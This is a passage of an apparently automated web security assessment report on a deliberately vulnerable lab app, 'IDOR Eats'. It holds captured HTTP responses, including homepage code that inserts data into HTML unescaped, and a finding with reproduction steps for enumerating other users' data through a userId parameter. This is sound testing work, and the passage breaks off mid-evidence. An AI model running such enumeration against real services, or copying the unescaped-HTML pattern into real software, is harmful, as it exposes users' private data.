+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 404
+connection: Keep-Alive
+content-length: 279
+content-type: text/html; charset=iso-8859-1
+date: Mon, 29 Jun 2026 06:18:08 GMT
+keep-alive: timeout=5, max=99
+server: Apache/2.4.41 (Ubuntu)
+
+&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;404 Not Found&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Not Found&lt;/h1&gt;
+&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;
+&lt;hr&gt;
+&lt;address&gt;Apache/2.4.41 (Ubuntu) Server at target.local Port 32852&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqytsagd-5y</code> — <code>artifacts/_/ev-mqytsagd-5y/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:32852
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+cache-control: no-store, no-cache, must-revalidate
+connection: Keep-Alive
+content-length: 11265
+content-type: text/html; charset=UTF-8
+date: Mon, 29 Jun 2026 06:17:09 GMT
+expires: Thu, 19 Nov 1981 08:52:00 GMT
+keep-alive: timeout=5, max=100
+pragma: no-cache
+server: Apache/2.4.41 (Ubuntu)
+set-cookie: &lt;redacted&gt;
+vary: Accept-Encoding
+
+
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;&gt;
+    &lt;title&gt;IDOR Eats&lt;/title&gt;
+    &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+    &lt;style&gt;
+        body {
+            background-color: #f8f9fa;
+        }
+        .navbar {
+            background-color: #000;
+        }
+        .navbar-brand, .nav-link {
+            color: #fff !important;
+        }
+        .nav-link:hover {
+            color: #76c043 !important;
+        }
+        .navbar-toggler-icon {
+            background-color: #fff;
+        }
+        header {
+            background-color: #000;
+            color: #fff;
+            padding: 50px 0;
+        }
+        header h1 {
+            color: #76c043;
+        }
+        .btn-primary {
+            background-color: #76c043;
+            border: none;
+        }
+        .btn-primary:hover {
+            background-color: #5a9b36;
+        }
+        .icon-box i {
+            font-size: 2em;
+            color: #76c043;
+        }
+        .icon-box h4 {
+            margin-top: 10px;
+            color: #000;
+        }
+        .card {
+            border: none;
+            margin-bottom: 20px;
+        }
+        .card img {
+            border-radius: 10px;
+        }
+        .section-title {
+            color: #000;
+            margin-bottom: 30px;
+        }
+        footer {
+            background-color: #000;
+            color: #fff;
+            padding: 20px 0;
+        }
+        footer a {
+            color: #76c043;
+        }
+        footer a:hover {
+            color: #5a9b36;
+        }
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;nav class=&quot;navbar navbar-expand-lg&quot;&gt;
+        &lt;div class=&quot;container-fluid&quot;&gt;
+            &lt;a class=&quot;navbar-brand&quot; href=&quot;#&quot;&gt;IDOR Eats&lt;/a&gt;
+            &lt;button class=&quot;navbar-toggler&quot; type=&quot;button&quot; data-bs-toggle=&quot;collapse&quot; data-bs-target=&quot;#navbarNav&quot; aria-controls=&quot;navbarNav&quot; aria-expanded=&quot;false&quot; aria-label=&quot;Toggle navigation&quot;&gt;
+                &lt;span class=&quot;navbar-toggler-icon&quot;&gt;&lt;/span&gt;
+            &lt;/button&gt;
+            &lt;div class=&quot;collapse navbar-collapse&quot; id=&quot;navbarNav&quot;&gt;
+                &lt;ul class=&quot;navbar-nav ms-auto&quot;&gt;
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link active&quot; aria-current=&quot;page&quot; href=&quot;#&quot;&gt;Home&lt;/a&gt;
+                    &lt;/li&gt;
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;#restaurants&quot;&gt;Restaurants&lt;/a&gt;
+                    &lt;/li&gt;
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;#how-it-works&quot;&gt;How It Works&lt;/a&gt;
+                    &lt;/li&gt;
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;#contact&quot;&gt;Contact&lt;/a&gt;
+                    &lt;/li&gt;
+                                            &lt;li class=&quot;nav-item&quot;&gt;
+                            &lt;a class=&quot;nav-link&quot; href=&quot;login.php&quot;&gt;Login&lt;/a&gt;
+                        &lt;/li&gt;
+                        &lt;li class=&quot;nav-item&quot;&gt;
+                            &lt;a class=&quot;nav-link&quot; href=&quot;register.php&quot;&gt;Sign Up&lt;/a&gt;
+                        &lt;/li&gt;
+                                    &lt;/ul&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/nav&gt;
+
+    &lt;header class=&quot;text-center&quot;&gt;
+        &lt;div class=&quot;container&quot;&gt;
+            &lt;h1 class=&quot;display-4&quot;&gt;Welcome to IDOR Eats&lt;/h1&gt;
+            &lt;p class=&quot;lead&quot;&gt;Order food from your favorite restaurants and get it delivered to your doorstep.&lt;/p&gt;
+            &lt;div class=&quot;input-group mb-3&quot;&gt;
+                &lt;input type=&quot;text&quot; id=&quot;search&quot; class=&quot;form-control&quot; placeholder=&quot;Search for restaurants...&quot;&gt;
+                &lt;div class=&quot;input-group-append&quot;&gt;
+                    &lt;button class=&quot;btn btn-primary&quot; type=&quot;button&quot; id=&quot;searchButton&quot;&gt;Search&lt;/button&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+            &lt;div id=&quot;results&quot; class=&quot;mt-4&quot;&gt;&lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/header&gt;
+
+    &lt;section id=&quot;restaurants&quot; class=&quot;py-5&quot;&gt;
+        &lt;div class=&quot;container&quot;&gt;
+            &lt;h2 class=&quot;text-center section-title&quot;&gt;Featured Restaurants&lt;/h2&gt;
+            &lt;div class=&quot;row&quot;&gt;
+                &lt;!-- Add featured restaurants here --&gt;
+                &lt;div class=&quot;col-md-4&quot;&gt;
+                    &lt;div class=&quot;card&quot;&gt;
+                        &lt;img src=&quot;static/images/restaurant1.jpg&quot; class=&quot;card-img-top&quot; alt=&quot;Restaurant 1&quot; style=&quot;height: 250px;&quot;&gt;
+                        &lt;div class=&quot;card-body&quot;&gt;
+                            &lt;h5 class=&quot;card-title&quot;&gt;Sushi World&lt;/h5&gt;
+                            &lt;p class=&quot;card-text&quot;&gt;Savor the taste of fresh and authentic sushi prepared by expert chefs.&lt;/p&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+                &lt;div class=&quot;col-md-4&quot;&gt;
+                    &lt;div class=&quot;card&quot;&gt;
+                        &lt;img src=&quot;static/images/restaurant2.jpg&quot; class=&quot;card-img-top&quot; alt=&quot;Restaurant 2&quot; style=&quot;height: 250px;&quot;&gt;
+                        &lt;div class=&quot;card-body&quot;&gt;
+                            &lt;h5 class=&quot;card-title&quot;&gt;Burger Haven&lt;/h5&gt;
+                            &lt;p class=&quot;card-text&quot;&gt;Enjoy the best gourmet burgers in town with a variety of toppings and sides.&lt;/p&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+                &lt;div class=&quot;col-md-4&quot;&gt;
+                    &lt;div class=&quot;card&quot;&gt;
+                        &lt;img src=&quot;static/images/restaurant3.jpg&quot; class=&quot;card-img-top&quot; alt=&quot;Restaurant 3&quot; style=&quot;height: 250px;&quot;&gt;
+                        &lt;div class=&quot;card-body&quot;&gt;
+                            &lt;h5 class=&quot;card-title&quot;&gt;The Gourmet Kitchen&lt;/h5&gt;
+                            &lt;p class=&quot;card-text&quot;&gt;Experience fine dining with a blend of exquisite flavors and top-notch service.&lt;/p&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/section&gt;
+
+    &lt;section id=&quot;how-it-works&quot; class=&quot;bg-light py-5&quot;&gt;
+        &lt;div class=&quot;container&quot;&gt;
+            &lt;h2 class=&quot;text-center section-title&quot;&gt;How It Works&lt;/h2&gt;
+            &lt;div class=&quot;row&quot;&gt;
+                &lt;div class=&quot;col-md-4&quot;&gt;
+                    &lt;div class=&quot;icon-box text-center&quot;&gt;
+                        &lt;i class=&quot;bi bi-search&quot;&gt;&lt;/i&gt;
+                        &lt;h4&gt;Search&lt;/h4&gt;
+                        &lt;p&gt;Find your favorite restaurants using our easy-to-use search tool.&lt;/p&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+                &lt;div class=&quot;col-md-4&quot;&gt;
+                    &lt;div class=&quot;icon-box text-center&quot;&gt;
+                        &lt;i class=&quot;bi bi-cart&quot;&gt;&lt;/i&gt;
+                        &lt;h4&gt;Order&lt;/h4&gt;
+                        &lt;p&gt;Place your order online with just a few clicks.&lt;/p&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+                &lt;div class=&quot;col-md-4&quot;&gt;
+                    &lt;div class=&quot;icon-box text-center&quot;&gt;
+                        &lt;i class=&quot;bi bi-truck&quot;&gt;&lt;/i&gt;
+                        &lt;h4&gt;Deliver&lt;/h4&gt;
+                        &lt;p&gt;Get your food delivered to your doorstep quickly and safely.&lt;/p&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/section&gt;
+
+    &lt;section id=&quot;contact&quot; class=&quot;py-5&quot;&gt;
+        &lt;div class=&quot;container&quot;&gt;
+            &lt;h2 class=&quot;text-center section-title&quot;&gt;Contact Us&lt;/h2&gt;
+            &lt;div class=&quot;row&quot;&gt;
+                &lt;div class=&quot;col-md-6&quot;&gt;
+                    &lt;form&gt;
+                        &lt;div class=&quot;mb-3&quot;&gt;
+                            &lt;label for=&quot;name&quot; class=&quot;form-label&quot;&gt;Name&lt;/label&gt;
+                            &lt;input type=&quot;text&quot; class=&quot;form-control&quot; id=&quot;name&quot; required&gt;
+                        &lt;/div&gt;
+                        &lt;div class=&quot;mb-3&quot;&gt;
+                            &lt;label for=&quot;email&quot; class=&quot;form-label&quot;&gt;Email&lt;/label&gt;
+                            &lt;input type=&quot;email&quot; class=&quot;form-control&quot; id=&quot;email&quot; required&gt;
+                        &lt;/div&gt;
+                        &lt;div class=&quot;mb-3&quot;&gt;
+                            &lt;label for=&quot;message&quot; class=&quot;form-label&quot;&gt;Message&lt;/label&gt;
+                            &lt;textarea class=&quot;form-control&quot; id=&quot;message&quot; rows=&quot;3&quot; required&gt;&lt;/textarea&gt;
+                        &lt;/div&gt;
+                        &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;Submit&lt;/button&gt;
+                    &lt;/form&gt;
+                &lt;/div&gt;
+                &lt;div class=&quot;col-md-6&quot;&gt;
+                    &lt;h4&gt;Get in Touch&lt;/h4&gt;
+                    &lt;p&gt;You can reach us at &lt;a href=&quot;mailto:support@idoreats.local&quot;&gt;support@idoreats.local&lt;/a&gt;.&lt;/p&gt;
+                    &lt;p&gt;Follow us on social media for the latest updates and offers:&lt;/p&gt;
+                    &lt;p&gt;
+                        &lt;a href=&quot;#&quot;&gt;&lt;i class=&quot;bi bi-facebook&quot;&gt;&lt;/i&gt; Facebook&lt;/a&gt;&lt;br&gt;
+                        &lt;a href=&quot;#&quot;&gt;&lt;i class=&quot;bi bi-twitter&quot;&gt;&lt;/i&gt; Twitter&lt;/a&gt;&lt;br&gt;
+                        &lt;a href=&quot;#&quot;&gt;&lt;i class=&quot;bi bi-instagram&quot;&gt;&lt;/i&gt; Instagram&lt;/a&gt;
+                    &lt;/p&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/section&gt;
+
+    &lt;footer class=&quot;text-center&quot;&gt;
+        &lt;div class=&quot;container&quot;&gt;
+            &lt;p&gt;&amp;copy; 2024 IDOR Eats. All rights reserved.&lt;/p&gt;
+        &lt;/div&gt;
+    &lt;/footer&gt;
+
+    &lt;script src=&quot;https://code.jquery.com/jquery-3.6.0.min.js&quot;&gt;&lt;/script&gt;
+    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;
+    &lt;script&gt;
+        $(document).ready(function() {
+            $('#searchButton').on('click', function() {
+                var searchQuery = $('#search').val();
+                $.ajax({
+                    url: 'api/search_restaurants.php',
+                    type: 'GET',
+                    data: { query: searchQuery },
+                    success: function(response) {
+                        if (response.success) {
+                            var results = response.data;
+                            var resultsContainer = $('#results');
+                            resultsContainer.empty(); // Clear previous results
+                            if (results.length &gt; 0) {
+                                results.forEach(function(restaurant) {
+                                    resultsContainer.append(
+                                        '&lt;div class=&quot;card mb-3&quot;&gt;' +
+                                            '&lt;div class=&quot;card-body&quot;&gt;' +
+                                                '&lt;h5 class=&quot;card-title&quot;&gt;' + restaurant.name + '&lt;/h5&gt;' +
+                                                '&lt;p class=&quot;card-text&quot;&gt;' + restaurant.description + '&lt;/p&gt;' +
+                                                '&lt;p class=&quot;card-text&quot;&gt;&lt;small class=&quot;text-muted&quot;&gt;' + restaurant.category + '&lt;/small&gt;&lt;/p&gt;' +
+                                            '&lt;/div&gt;' +
+                                        '&lt;/div&gt;'
+                                    );
+                                });
+                            } else {
+                                resultsContainer.html('&lt;div class=&quot;alert alert-warning&quot;&gt;No restaurants found.&lt;/div&gt;');
+                            }
+                        } else {
+                            $('#results').html('&lt;div class=&quot;alert alert-warning&quot;&gt;No restaurants found.&lt;/div&gt;');
+                        }
+                    },
+                    error: function() {
+                        $('#results').html('&lt;div class=&quot;alert alert-danger&quot;&gt;An error occurred while searching. Please try again.&lt;/div&gt;');
+                    }
+                });
+            });
+        });
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqyttizs-5z</code> — <code>artifacts/_/ev-mqyttizs-5z/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:32852
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+cache-control: no-store, no-cache, must-revalidate
+connection: Keep-Alive
+content-length: 11265
+content-type: text/html; charset=UTF-8
+date: Mon, 29 Jun 2026 06:18:07 GMT
+expires: Thu, 19 Nov 1981 08:52:00 GMT
+keep-alive: timeout=5, max=100
+pragma: no-cache
+server: Apache/2.4.41 (Ubuntu)
+set-cookie: &lt;redacted&gt;
+vary: Accept-Encoding
+
+
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;&gt;
+    &lt;title&gt;IDOR Eats&lt;/title&gt;
+    &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+    &lt;style&gt;
+        body {
+            background-color: #f8f9fa;
+        }
+        .navbar {
+            background-color: #000;
+        }
+        .navbar-brand, .nav-link {
+            color: #fff !important;
+        }
+        .nav-link:hover {
+            color: #76c043 !important;
+        }
+        .navbar-toggler-icon {
+            background-color: #fff;
+        }
+        header {
+            background-color: #000;
+            color: #fff;
+            padding: 50px 0;
+        }
+        header h1 {
+            color: #76c043;
+        }
+        .btn-primary {
+            background-color: #76c043;
+            border: none;
+        }
+        .btn-primary:hover {
+            background-color: #5a9b36;
+        }
+        .icon-box i {
+            font-size: 2em;
+            color: #76c043;
+        }
+        .icon-box h4 {
+            margin-top: 10px;
+            color: #000;
+        }
+        .card {
+            border: none;
+            margin-bottom: 20px;
+        }
+        .card img {
+            border-radius: 10px;
+        }
+        .section-title {
+            color: #000;
+            margin-bottom: 30px;
+        }
+        footer {
+            background-color: #000;
+            color: #fff;
+            padding: 20px 0;
+        }
+        footer a {
+            color: #76c043;
+        }
+        footer a:hover {
+            color: #5a9b36;
+        }
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;nav class=&quot;navbar navbar-expand-lg&quot;&gt;
+        &lt;div class=&quot;container-fluid&quot;&gt;
+            &lt;a class=&quot;navbar-brand&quot; href=&quot;#&quot;&gt;IDOR Eats&lt;/a&gt;
+            &lt;button class=&quot;navbar-toggler&quot; type=&quot;button&quot; data-bs-toggle=&quot;collapse&quot; data-bs-target=&quot;#navbarNav&quot; aria-controls=&quot;navbarNav&quot; aria-expanded=&quot;false&quot; aria-label=&quot;Toggle navigation&quot;&gt;
+                &lt;span class=&quot;navbar-toggler-icon&quot;&gt;&lt;/span&gt;
+            &lt;/button&gt;
+            &lt;div class=&quot;collapse navbar-collapse&quot; id=&quot;navbarNav&quot;&gt;
+                &lt;ul class=&quot;navbar-nav ms-auto&quot;&gt;
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link active&quot; aria-current=&quot;page&quot; href=&quot;#&quot;&gt;Home&lt;/a&gt;
+                    &lt;/li&gt;
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;#restaurants&quot;&gt;Restaurants&lt;/a&gt;
+                    &lt;/li&gt;
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;#how-it-works&quot;&gt;How It Works&lt;/a&gt;
+                    &lt;/li&gt;
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;#contact&quot;&gt;Contact&lt;/a&gt;
+                    &lt;/li&gt;
+                                            &lt;li class=&quot;nav-item&quot;&gt;
+                            &lt;a class=&quot;nav-link&quot; href=&quot;login.php&quot;&gt;Login&lt;/a&gt;
+                        &lt;/li&gt;
+                        &lt;li class=&quot;nav-item&quot;&gt;
+                            &lt;a class=&quot;nav-link&quot; href=&quot;register.php&quot;&gt;Sign Up&lt;/a&gt;
+                        &lt;/li&gt;
+                                    &lt;/ul&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/nav&gt;
+
+    &lt;header class=&quot;text-center&quot;&gt;
+        &lt;div class=&quot;container&quot;&gt;
+            &lt;h1 class=&quot;display-4&quot;&gt;Welcome to IDOR Eats&lt;/h1&gt;
+            &lt;p class=&quot;lead&quot;&gt;Order food from your favorite restaurants and get it delivered to your doorstep.&lt;/p&gt;
+            &lt;div class=&quot;input-group mb-3&quot;&gt;
+                &lt;input type=&quot;text&quot; id=&quot;search&quot; class=&quot;form-control&quot; placeholder=&quot;Search for restaurants...&quot;&gt;
+                &lt;div class=&quot;input-group-append&quot;&gt;
+                    &lt;button class=&quot;btn btn-primary&quot; type=&quot;button&quot; id=&quot;searchButton&quot;&gt;Search&lt;/button&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+            &lt;div id=&quot;results&quot; class=&quot;mt-4&quot;&gt;&lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/header&gt;
+
+    &lt;section id=&quot;restaurants&quot; class=&quot;py-5&quot;&gt;
+        &lt;div class=&quot;container&quot;&gt;
+            &lt;h2 class=&quot;text-center section-title&quot;&gt;Featured Restaurants&lt;/h2&gt;
+            &lt;div class=&quot;row&quot;&gt;
+                &lt;!-- Add featured restaurants here --&gt;
+                &lt;div class=&quot;col-md-4&quot;&gt;
+                    &lt;div class=&quot;card&quot;&gt;
+                        &lt;img src=&quot;static/images/restaurant1.jpg&quot; class=&quot;card-img-top&quot; alt=&quot;Restaurant 1&quot; style=&quot;height: 250px;&quot;&gt;
+                        &lt;div class=&quot;card-body&quot;&gt;
+                            &lt;h5 class=&quot;card-title&quot;&gt;Sushi World&lt;/h5&gt;
+                            &lt;p class=&quot;card-text&quot;&gt;Savor the taste of fresh and authentic sushi prepared by expert chefs.&lt;/p&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+                &lt;div class=&quot;col-md-4&quot;&gt;
+                    &lt;div class=&quot;card&quot;&gt;
+                        &lt;img src=&quot;static/images/restaurant2.jpg&quot; class=&quot;card-img-top&quot; alt=&quot;Restaurant 2&quot; style=&quot;height: 250px;&quot;&gt;
+                        &lt;div class=&quot;card-body&quot;&gt;
+                            &lt;h5 class=&quot;card-title&quot;&gt;Burger Haven&lt;/h5&gt;
+                            &lt;p class=&quot;card-text&quot;&gt;Enjoy the best gourmet burgers in town with a variety of toppings and sides.&lt;/p&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+                &lt;div class=&quot;col-md-4&quot;&gt;
+                    &lt;div class=&quot;card&quot;&gt;
+                        &lt;img src=&quot;static/images/restaurant3.jpg&quot; class=&quot;card-img-top&quot; alt=&quot;Restaurant 3&quot; style=&quot;height: 250px;&quot;&gt;
+                        &lt;div class=&quot;card-body&quot;&gt;
+                            &lt;h5 class=&quot;card-title&quot;&gt;The Gourmet Kitchen&lt;/h5&gt;
+                            &lt;p class=&quot;card-text&quot;&gt;Experience fine dining with a blend of exquisite flavors and top-notch service.&lt;/p&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/section&gt;
+
+    &lt;section id=&quot;how-it-works&quot; class=&quot;bg-light py-5&quot;&gt;
+        &lt;div class=&quot;container&quot;&gt;
+            &lt;h2 class=&quot;text-center section-title&quot;&gt;How It Works&lt;/h2&gt;
+            &lt;div class=&quot;row&quot;&gt;
+                &lt;div class=&quot;col-md-4&quot;&gt;
+                    &lt;div class=&quot;icon-box text-center&quot;&gt;
+                        &lt;i class=&quot;bi bi-search&quot;&gt;&lt;/i&gt;
+                        &lt;h4&gt;Search&lt;/h4&gt;
+                        &lt;p&gt;Find your favorite restaurants using our easy-to-use search tool.&lt;/p&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+                &lt;div class=&quot;col-md-4&quot;&gt;
+                    &lt;div class=&quot;icon-box text-center&quot;&gt;
+                        &lt;i class=&quot;bi bi-cart&quot;&gt;&lt;/i&gt;
+                        &lt;h4&gt;Order&lt;/h4&gt;
+                        &lt;p&gt;Place your order online with just a few clicks.&lt;/p&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+                &lt;div class=&quot;col-md-4&quot;&gt;
+                    &lt;div class=&quot;icon-box text-center&quot;&gt;
+                        &lt;i class=&quot;bi bi-truck&quot;&gt;&lt;/i&gt;
+                        &lt;h4&gt;Deliver&lt;/h4&gt;
+                        &lt;p&gt;Get your food delivered to your doorstep quickly and safely.&lt;/p&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/section&gt;
+
+    &lt;section id=&quot;contact&quot; class=&quot;py-5&quot;&gt;
+        &lt;div class=&quot;container&quot;&gt;
+            &lt;h2 class=&quot;text-center section-title&quot;&gt;Contact Us&lt;/h2&gt;
+            &lt;div class=&quot;row&quot;&gt;
+                &lt;div class=&quot;col-md-6&quot;&gt;
+                    &lt;form&gt;
+                        &lt;div class=&quot;mb-3&quot;&gt;
+                            &lt;label for=&quot;name&quot; class=&quot;form-label&quot;&gt;Name&lt;/label&gt;
+                            &lt;input type=&quot;text&quot; class=&quot;form-control&quot; id=&quot;name&quot; required&gt;
+                        &lt;/div&gt;
+                        &lt;div class=&quot;mb-3&quot;&gt;
+                            &lt;label for=&quot;email&quot; class=&quot;form-label&quot;&gt;Email&lt;/label&gt;
+                            &lt;input type=&quot;email&quot; class=&quot;form-control&quot; id=&quot;email&quot; required&gt;
+                        &lt;/div&gt;
+                        &lt;div class=&quot;mb-3&quot;&gt;
+                            &lt;label for=&quot;message&quot; class=&quot;form-label&quot;&gt;Message&lt;/label&gt;
+                            &lt;textarea class=&quot;form-control&quot; id=&quot;message&quot; rows=&quot;3&quot; required&gt;&lt;/textarea&gt;
+                        &lt;/div&gt;
+                        &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;Submit&lt;/button&gt;
+                    &lt;/form&gt;
+                &lt;/div&gt;
+                &lt;div class=&quot;col-md-6&quot;&gt;
+                    &lt;h4&gt;Get in Touch&lt;/h4&gt;
+                    &lt;p&gt;You can reach us at &lt;a href=&quot;mailto:support@idoreats.local&quot;&gt;support@idoreats.local&lt;/a&gt;.&lt;/p&gt;
+                    &lt;p&gt;Follow us on social media for the latest updates and offers:&lt;/p&gt;
+                    &lt;p&gt;
+                        &lt;a href=&quot;#&quot;&gt;&lt;i class=&quot;bi bi-facebook&quot;&gt;&lt;/i&gt; Facebook&lt;/a&gt;&lt;br&gt;
+                        &lt;a href=&quot;#&quot;&gt;&lt;i class=&quot;bi bi-twitter&quot;&gt;&lt;/i&gt; Twitter&lt;/a&gt;&lt;br&gt;
+                        &lt;a href=&quot;#&quot;&gt;&lt;i class=&quot;bi bi-instagram&quot;&gt;&lt;/i&gt; Instagram&lt;/a&gt;
+                    &lt;/p&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/section&gt;
+
+    &lt;footer class=&quot;text-center&quot;&gt;
+        &lt;div class=&quot;container&quot;&gt;
+            &lt;p&gt;&amp;copy; 2024 IDOR Eats. All rights reserved.&lt;/p&gt;
+        &lt;/div&gt;
+    &lt;/footer&gt;
+
+    &lt;script src=&quot;https://code.jquery.com/jquery-3.6.0.min.js&quot;&gt;&lt;/script&gt;
+    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;
+    &lt;script&gt;
+        $(document).ready(function() {
+            $('#searchButton').on('click', function() {
+                var searchQuery = $('#search').val();
+                $.ajax({
+                    url: 'api/search_restaurants.php',
+                    type: 'GET',
+                    data: { query: searchQuery },
+                    success: function(response) {
+                        if (response.success) {
+                            var results = response.data;
+                            var resultsContainer = $('#results');
+                            resultsContainer.empty(); // Clear previous results
+                            if (results.length &gt; 0) {
+                                results.forEach(function(restaurant) {
+                                    resultsContainer.append(
+                                        '&lt;div class=&quot;card mb-3&quot;&gt;' +
+                                            '&lt;div class=&quot;card-body&quot;&gt;' +
+                                                '&lt;h5 class=&quot;card-title&quot;&gt;' + restaurant.name + '&lt;/h5&gt;' +
+                                                '&lt;p class=&quot;card-text&quot;&gt;' + restaurant.description + '&lt;/p&gt;' +
+                                                '&lt;p class=&quot;card-text&quot;&gt;&lt;small class=&quot;text-muted&quot;&gt;' + restaurant.category + '&lt;/small&gt;&lt;/p&gt;' +
+                                            '&lt;/div&gt;' +
+                                        '&lt;/div&gt;'
+                                    );
+                                });
+                            } else {
+                                resultsContainer.html('&lt;div class=&quot;alert alert-warning&quot;&gt;No restaurants found.&lt;/div&gt;');
+                            }
+                        } else {
+                            $('#results').html('&lt;div class=&quot;alert alert-warning&quot;&gt;No restaurants found.&lt;/div&gt;');
+                        }
+                    },
+                    error: function() {
+                        $('#results').html('&lt;div class=&quot;alert alert-danger&quot;&gt;An error occurred while searching. Please try again.&lt;/div&gt;');
+                    }
+                });
+            });
+        });
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-3">
+<h3><span class="badge" style="background:#f57c00">MEDIUM</span> 3. [idor] IDOR: any authenticated user can read any user's favorite restaurants and username via userId</h3>
+<div class="kv">Screen: <code>s-0011</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32852/</div>
+<div class="desc">GET /api/get_favorite_restaurants.php?userId=&lt;n&gt; requires a valid session but performs no authorization check tying the requested userId to the logged-in user. Authenticated as user 29 (emailxss2), supplying userId=1 reliably returns user &quot;not_that_easy&quot; with 8 favorite restaurants (177B), and userId=2 returns user &quot;user1&quot;. Enumerating userId discloses every user's username and favorites (BOLA/IDOR). A request for a non-existent userId returns success:false, and a request with no session returns &quot;User not authenticated&quot; — so the broken control is per-object authorization, not authentication.</div>
+<div><b>Reproduction</b></div><pre>1. Log in to your own account (user 29). 2. GET /api/get_favorite_restaurants.php?userId=1 with the session cookie → 200 {&quot;success&quot;:true,&quot;data&quot;:{&quot;username&quot;:&quot;not_that_easy&quot;,...}} (repeatable, 177B). 3. Vary userId (2 → &quot;user1&quot;, etc.) to enumerate other users. 4. Negative control: userId=999999 → {&quot;success&quot;:false,&quot;message&quot;:&quot;No favorite restaurants found for this user.&quot;} (75B). Cross-user data is returned with no ownership check.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqyt2kj7-44</code> — <code>artifacts/s-0011/ev-mqyt2kj7-44/</code></div><div class="lbl">REQUEST</div><pre>GET /api/get_favorite_restaurants.php?userId=999999 HTTP/1.1
+Host: target.local:32852
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+cache-control: no-store, no-cache, must-revalidate
+connection: Keep-Alive
+content-length: 75
+content-type: application/json
